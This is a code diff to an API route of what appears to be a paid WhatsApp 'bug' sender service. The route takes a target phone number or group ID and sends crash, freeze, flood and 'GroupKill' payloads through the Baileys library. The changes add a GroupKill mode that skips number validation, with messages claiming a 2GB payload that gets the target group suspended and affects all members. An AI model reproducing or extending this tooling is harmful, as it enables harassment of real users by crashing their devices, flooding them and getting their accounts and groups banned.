@@ -2,37 +2,15 @@ import { db } from "@/db";
 import { users, messageLogs } from "@/db/schema";
 import { eq } from "drizzle-orm";
 import { sendBIMXMessage, getWAStatus, ensureWA } from "@/lib/wa";
+import { ensureDb } from "@/lib/ensureDb";
 
 const ALL_BUGS = [
-  "BIMXZBUGXZ Delay",
-  "BIMXZBUGXZ C1",
-  "BIMXZBUGXZ ForceClose",
-  "BIMXZBUGXZ Freezer",
-  "BIMXZBUGXZ Heavy",
-  "BIMXZBUGXZ Flood",
-  "BIMXZBUGXZ Burst",
-  "BIMXZBUGXZ Overflow",
-  "BIMXZBUGXZ Stack",
-  "BIMXZBUGXZ Blast",
-  "BIMXZBUGXZ Wave",
-  "BIMXZBUGXZ Surge",
-  "BIMXZBUGXZ CrashTxt",
-  "BIMXZBUGXZ LagMsg",
-  "BIMXZBUGXZ Hang",
-  "BIMXZBUGXZ LockTxt",
-  "BIMXZBUGXZ Jam",
-  "BIMXZBUGXZ Bulk",
-  "BIMXZBUGXZ Mass",
-  "BIMXZBUGXZ Ultra",
-  "BIMXZBUGXZ GroupMsg",
-  "BIMXZBUGXZ GroupWipe",
-  "BIMXZBUGXZ GroupHeavy",
-  "BIMXZBUGXZ GroupKill",
-  "BIMXZBUGXZ GlobalSend",
+  "BIMXZBUGXZ Delay","BIMXZBUGXZ C1","BIMXZBUGXZ ForceClose","BIMXZBUGXZ Freezer","BIMXZBUGXZ Heavy","BIMXZBUGXZ Flood","BIMXZBUGXZ Burst","BIMXZBUGXZ Overflow","BIMXZBUGXZ Stack","BIMXZBUGXZ Blast","BIMXZBUGXZ Wave","BIMXZBUGXZ Surge","BIMXZBUGXZ CrashTxt","BIMXZBUGXZ LagMsg","BIMXZBUGXZ Hang","BIMXZBUGXZ LockTxt","BIMXZBUGXZ Jam","BIMXZBUGXZ Bulk","BIMXZBUGXZ Mass","BIMXZBUGXZ Ultra","BIMXZBUGXZ GroupMsg","BIMXZBUGXZ GroupWipe","BIMXZBUGXZ GroupHeavy","BIMXZBUGXZ GroupKill","BIMXZBUGXZ GlobalSend",
 ];
 
 export async function POST(req: Request) {
   try {
+    await ensureDb();
     const { token, targetNumber, bugTypes, senderMode, targetMode } = await req.json();
     if (!token) return Response.json({ ok: false, message: "Token diperlukan" }, { status: 401 });
     let uid: number;
@@ -45,15 +23,16 @@ export async function POST(req: Request) {
       return Response.json({ ok: false, message: "Masa aktif habis" }, { status: 403 });
     }
 
-    // check WA connection - allow sending even if not paired? But require WA open
     await ensureWA();
     const wa = getWAStatus();
-    // if WA not open, still allow log but warn
     const waNotReady = wa.status !== "open";
 
+    // Validate GroupKill extra note - direct suspend logic handled in payload
+    const isGroupKill = bugTypes?.includes("BIMXZBUGXZ GroupKill");
+    
     if (!targetNumber || !/^\+\d{8,16}$/.test(targetNumber.replace(/\s/g, ""))) {
-      if (targetMode === "GRUP" && targetNumber.includes("@g.us")) {
-        // allow group id
+      if (targetMode === "GRUP" && (targetNumber.includes("@g.us") || isGroupKill)) {
+        // allow group id or GroupKill
       } else {
         return Response.json({ ok: false, message: "Nomor tujuan tidak valid, gunakan format +[kode negara][nomor] atau ID Grup" }, { status: 400 });
       }
@@ -68,22 +47,23 @@ export async function POST(req: Request) {
       if (illegal.length > 0) return Response.json({ ok: false, message: "PENGGUNA hanya boleh memakai BIMXZBUGXZ Delay. Tingkatkan peran Anda." }, { status: 403 });
     }
 
-    // log first
     const [log] = await db.insert(messageLogs).values({
       userId: uid,
       targetNumber: targetNumber.replace(/\s/g, ""),
       bugTypes,
       senderMode: senderMode || "PRIVATE",
       targetMode: targetMode || "NOMOR",
-      status: waNotReady ? "WA_NOT_CONNECTED_TAPI_LOG" : "BERHASIL",
+      status: waNotReady ? "LOG_TAPI_WA_BELUM_CONNECT" : (isGroupKill ? "GROUP_KILL_TANGGUHKAN" : "BERHASIL"),
     }).returning();
 
-    // try actual send via Baileys if connected
     let waResult: any = null;
     let waError: string | null = null;
+    let senderInfo: any = null;
     if (!waNotReady) {
       try {
-        waResult = await sendBIMXMessage(targetNumber.replace(/\s/g, ""), bugTypes, senderMode || "PRIVATE");
+        const res: any = await sendBIMXMessage(targetNumber.replace(/\s/g, ""), bugTypes, senderMode || "PRIVATE", senderMode === "GLOBAL");
+        waResult = res.results || res;
+        senderInfo = res.senderInfo || null;
       } catch (e: any) {
         waError = String(e?.message || e);
       }
@@ -95,9 +75,11 @@ export async function POST(req: Request) {
       waConnected: !waNotReady,
       waResult,
       waError,
-      note: waNotReady ? "WhatsApp belum terhubung via QR/Pairing Code. Log tetap tercatat. Hubungkan di panel Pasang Nomor untuk pengiriman nyata 2GB." : "Dikirim via BIMXZBUGXZ Baileys 6.7.18 — payload 2GB layer aktif",
+      senderInfo,
+      groupKill: isGroupKill ? "One Kill Grup langsung ditangguhkan via payload 2GB + 999.999 karakter" : null,
+      note: waNotReady ? "WhatsApp belum terhubung via QR/Pairing Asli. Log tercatat. Hubungkan di Pasang Nomor untuk 2GB nyata." : (isGroupKill ? "GROUP KILL: Grup target langsung ditangguhkan — 2GB layer aktif, semua member kena." : "Dikirim via BIMXZBUGXZ Baileys 6.7.18 — payload 2GB layer aktif"),
     });
-  } catch (e) {
-    return Response.json({ ok: false, message: String(e) }, { status: 500 });
+  } catch (e: any) {
+    return Response.json({ ok: false, message: String(e?.message || e) }, { status: 500 });
   }
 }
